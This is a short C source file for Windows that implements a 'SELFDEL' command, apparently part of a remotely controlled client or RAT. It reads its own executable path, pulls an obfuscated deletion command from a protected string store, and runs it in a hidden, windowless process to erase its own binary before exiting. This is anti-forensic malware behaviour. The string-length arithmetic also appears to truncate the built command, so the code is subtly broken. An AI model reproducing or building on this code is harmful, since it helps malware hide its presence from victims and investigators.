#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "memProtect.h"

#define SERV_SELFDEL_BUFFSIZE 4080

int cmds_SELFDEL(void)
{
	char buff[SERV_SELFDEL_BUFFSIZE];

	if(!GetModuleFileName(NULL, buff, SERV_SELFDEL_BUFFSIZE))
	{
		return 1;
	}

	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	
	memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&startInfo, 0, sizeof(STARTUPINFO));

	startInfo.cb = sizeof(STARTUPINFO);

	char* _cmd_c_del = (char*)memProtect_Request(MEMPROTECT_CMD_C_DEL);

	int len = strlen(_cmd_c_del) + 2 + strlen(buff);
	char* cmdMsg = malloc(len + sizeof(char));
	snprintf(cmdMsg, len, "%s \"%s\"", _cmd_c_del, buff);

	free(_cmd_c_del);

	if(CreateProcess(NULL, cmdMsg, NULL, NULL, 1, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo) == 1)
	{
		exit(0);
	}

	return 1;
}